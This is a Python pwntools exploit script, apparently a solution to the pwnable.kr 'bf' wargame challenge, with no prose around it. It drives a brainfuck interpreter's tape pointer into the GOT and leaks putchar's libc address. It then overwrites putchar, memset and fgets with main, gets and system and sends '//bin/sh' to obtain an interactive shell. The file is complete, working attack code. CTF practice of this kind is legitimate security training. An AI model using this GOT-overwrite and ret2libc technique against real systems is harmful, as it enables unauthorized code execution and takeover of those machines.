from pwn import *

r=remote('pwnable.kr',9001)
elf=ELF('./bf')
libc=ELF('./bf_libc.so')

#got_scf=elf.got['__stack_chk_fail']		(Useless)
got_mst=elf.got['memset']
got_pch=elf.got['putchar']
got_fgt=elf.got['fgets']
smb_tap=elf.symbols['tape']
#lbc_scf=libc.symbols['__stack_chk_fail']	(Useless)
lbc_sys=libc.symbols['system'] 	
lbc_get=libc.symbols['gets']
lbc_pch=libc.symbols['putchar'] 	
tru_main=0x08048671
#Roprtn=0x80487fd				(Useless)

def ishow(n):
	return '.>'*n
def iwritein(n):
	return ',>'*n
def upward(n):
	return '<'*n
def downward(n):
	return '>'*n

r.recvuntil(']\n')

#leak_address_of_pch
payload=upward(smb_tap-got_pch)+'.'+ishow(4)
#main override putchar 
payload+=upward(0+4)+iwritein(4)
#gets override memset
payload+=upward(got_pch-got_mst+4)+iwritein(4)
#system override fgets
payload+=upward(got_mst-got_fgt+4)+iwritein(4)
#return to main
payload+='.'

r.sendline(payload)

print 'JUNK:'+r.recv(1)
#print hex(u32(str(r.recv(4))))			(Useless)
offset=hex(int(hex(u32(r.recv(4))),16)-lbc_pch)
print 'OFFSET:'+offset
#tru_scf=offset+lbc_scf
tru_sys=int(offset,16)+lbc_sys
tru_get=int(offset,16)+lbc_get

r.send(p32(tru_main))
r.send(p32(tru_get))
r.send(p32(tru_sys))
r.sendline('//bin/sh\0')

r.interactive()
